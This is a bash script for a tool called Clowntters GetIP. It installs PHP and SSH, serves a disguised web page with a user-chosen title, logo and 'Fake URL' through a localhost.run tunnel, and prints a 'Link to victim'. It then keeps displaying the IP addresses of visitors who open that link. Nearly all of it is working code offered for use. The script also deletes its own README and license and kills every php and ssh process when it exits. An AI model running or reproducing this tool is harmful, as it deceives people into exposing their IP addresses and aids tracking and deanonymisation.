#!/usr/bin/env bash
# by: @Mike90s15 (Mike Edwards)
# 07/14/2023
# version: 1.0.1

trap _exit EXIT
function _exit() 
{
  clear
  pkill php; pkill ssh
  clear
  cat ip.txt > ips.txt
  for i in 'a.txt' 'ip.txt' 'index.php' 'index.phpE' "./${logo}"; do
    [[ -f "${i}" ]] && rm "${i}"
  done
  [[ -f "ip.txt" ]] &&  printf " IPs on ips.txt: cat ips.txt\n"
  sleep 2
  xdg-open https://instagram.com/mike90s15 &>/dev/null
  printf "\n\e[1;34m Mike90s15 say: Goodbye, see you!\n"
  exit 0
}
xdg-open https://t.me/channel_90s15 &>/dev/null
rm README.md LICENSE .gitignore

function _banner() {
  local IFS=""
  local banner
  banner=("\ec \e[1;33m" ".--------.____________" "|| ° ° ° °     .2021.|| \e[1;32m®\e[1;33m" "||                    | \e[1;32m©\e[1;33m" "||\     ______________________" "|| \   // ° ° ° ° ° ° ° ° ° °/" "||\ \ //                    /" "|| \ //                    /" "||\ //                    /" "|| //                    /" "||//                    /" "||/                    /" "|/____________________/" "\e[1;31mFile: Clownters \e[m\n" "\e[1;35m  <<< CLOWNTERS GetIP $(date +%Y/%m/%d) >>>" "\e[1;32m=======================================\n")
  for i in "${banner[@]}"; do
    sleep 0.001
    printf " $i\n"
  done
}

if ! [[ -f ".okay" ]]; then
  _banner
  pkg="apt-get"
  [[ "${HOME}" == "/data/data/com.termux/files/home" ]] && pkg="pkg"

  printf "\e[1;32m $\e[1;34m Installing SSH\n"
  if ! command -v openssh &>/dev/null; then
    "${pkg}" install -y openssh &>/dev/null || {
      echo "Error installing openssh."
      exit 1
    }
  fi

  printf "\e[1;32m $\e[1;34m Installing PHP\n"
  if ! command -v php &>/dev/null; then
    "${pkg}" install -y php &>/dev/null || {
      echo "Error installing php."
      exit 1
    }
  fi

  _banner
  printf "\e[1;33m Type yes to continue\e[m\n\n"
  ssh -R 80:localhost:8181 nokey@localhost.run &>/dev/null &
  sleep 20
  touch .okay
fi

> ip.txt
cp index index.php
_banner
printf "\e[1;34m Example: Cats Website\n"
read -t 120 -p $'\e[1;34m Site Title:\e[1;36m ' title
if [[ -n "${title}" ]]; then
  while :; do
    printf "\e[1;34m Example: https://cat.com/img.jpg or /home/user/img.jpg\n"
    read -t 120 -p $'\e[1;34m URL for site logo:\e[1;36m ' logo
    if [[ "${logo}" =~ ^(https?|http?)://.*\.(jpeg|jpg|png)$ ]]; then
      logo="$(echo "${logo}" | sed 's/\//\\\//g')"
      break
    elif [[ -f "${logo}" ]]; then
      if [[ ! -f "./${logo}" ]]; then
        cp "${logo}" .
      fi
      logo="$(basename "${logo}")"
      break
    else
      echo "Error: Invalid path or URL."
      exit 1
    fi
  done

  printf "\e[1;34m Example: Cute Cats pic\n"
  read -t 120 -p $'\e[1;34m Description for display:\e[1;36m ' description
  printf "\e[1;34m Example: cats.com\n"
  read -t 120 -p $'\e[1;34m Fake URL:\e[1;36m ' fake_url

  fake_url="$(echo "${fake_url}" | sed 's/\//\\\//g')"

  sed -iE "s/<title>.*/<title>${title}<\/title>/" index.php
  sed -iE "s/Clown.*tion/${title}/g" index.php
  sed -iE "s#http.*jpg#${logo}#g" index.php
  sed -iE "s/<link.*/<link rel=\"icon\" href=\"${logo}\">/" index.php
  sed -iE "s/@MI.*it/${description}/g" index.php
  sed -iE "s/https.*clownters.com/${fake_url}/g" index.php

  printf "\e[1;34m Loading..."
fi

php -S localhost:8181 &>/dev/null &
ssh -R 80:localhost:8181 nokey@localhost.run &>a.txt &
sleep 10

printf "  \e[1;34mLink to victim:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n  \e[1;34mYour localhost:\e[0;32m http://localhost:8181\n\n"
while :; do
  if [[ "$(stat -c %Y ip.txt)" -ne "${ips_last_modified}" ]]; then
    _banner
    printf "  \e[1;34mLink to victim:\e[0;32m$(sed 's/,/\n/g' a.txt | grep ' h' | grep '.li')\n  \e[1;34mYour localhost:\e[0;32m http://localhost:8181\n\n"
    cat ip.txt
    ips_last_modified=$(stat -c %Y ip.txt)
    sleep 5
  fi
done
